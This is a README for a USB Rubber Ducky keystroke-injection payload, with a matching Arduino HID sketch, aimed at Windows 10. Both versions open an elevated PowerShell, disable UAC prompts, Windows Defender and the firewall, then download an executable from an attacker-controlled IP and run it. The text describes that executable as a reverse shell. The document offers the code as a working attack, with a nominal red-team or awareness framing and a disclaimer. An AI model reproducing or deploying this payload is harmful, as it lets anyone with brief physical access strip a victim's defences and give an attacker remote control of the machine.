## بسم الله الرحمن الرحيم

## Summary
A simple Rubber Duck Payload to _disabling Windows UAC, Windows Firewall, and Windows Defender._<br/>

In this payload, we also add a _function to download a file from server and executing it automatically_. As a note, at the PoC Video, the file was a reverse shell that will be connect into the Attacker machine when executed at the victim OS.<br/>

Generally, this script could help to conduct the Security Awareness at the end-user or conduct one of the red-team scenario.<br/>

## Note
* We using Arduino that supported the HID.<br/>
* _“You take responsibility for any laws you break with this”_ - Quote by D4rkR4bb1t<br/>

## The Payload
The payload are not the original one since we combine one payload with another payload. <br/>
Please kindly note, this payload was executed within 10 seconds. Logically, it could be modify to less than 10 seconds since we put the delay around 1000 - 1500 ms.<br/>

Payload:<br/>
```
REM Automate Turn-Off - Windows UAC, Windows Firewall, and Windows Defender
REM Also automate to Download the malware and connect with Reverse Shell
GUI r
DELAY 1000
REM Open the Powershell as Administrator
STRING powershell Start-Process powershell -Verb runAs
ENTER
DELAY 1500
ALT y
ENTER
DELAY 1000
REM Disabling the UAC
STRING Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
ENTER
DELAY 1000
REM Disabling the Firewall Part 1
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
DELAY 1000
REM Disabling the Firewall Part 2
STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
ENTER
DELAY 1000
REM Disabling the Virus and Threat Protection
STRING New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force
ENTER
DELAY 1000
REM Moving into C Directory
STRING cd C:\
ENTER
REM Download the Prepared Malware
STRING $WC = New-Object System.Net.WebClient
ENTER
STRING $WC.DownloadFile("http://192.168.13.129/exploit.exe","C:\exploit.exe")
ENTER
DELAY 500
REM Execute the Downloaded Malware
STRING .\exploit.exe
ENTER
DELAY 1000
ENTER
STRING exit
ENTER
```

## The Code for Arduino
This code was design for the one that used the Arduino board<br/>

Code:<br/>
```
/*
 * Generated by Dckuino.js, an open source project !
 * Automate to Turn Off the Windows UAC, Windows Firewall, and Windows Defender at Windows 10 & Connect to Reverse Shell within 10 sec
 * Just modify the delay parameter to make it more fast
 */

#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.print("powershell Start-Process powershell -Verb runAs");

  typeKey(KEY_RETURN);

  delay(1500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("New-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("cd C:\\");

  typeKey(KEY_RETURN);

  Keyboard.print("$WC = New-Object System.Net.WebClient");

  typeKey(KEY_RETURN);

  Keyboard.print("$WC.DownloadFile(\"http://192.168.13.129/exploit.exe\",\"C:\\exploit.exe\")");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print(".\\exploit.exe");

  typeKey(KEY_RETURN);

  delay(1000);

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
```

## References:
*  <a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads"> Collection of Payload from Hak5darren Repository</a>
* <a href="https://gallery.technet.microsoft.com/scriptcenter/Disable-UAC-using-730b6ecd"> Disabling Windows UAC</a>
* <a href="https://theitbros.com/managing-windows-defender-using-powershell/"> Disabling Windows Defender and Windows Firewall</a>
* <a href="https://www.faqforge.com/windows/turn-off-firewall-using-powershell-command-prompt/"> Disabling Windows Firewall - 2nd Reference</a>
* <a href="https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell"> Download a File from Server</a>

## PoC Video:
```
https://www.youtube.com/watch?v=bR55mTpU3z8
```
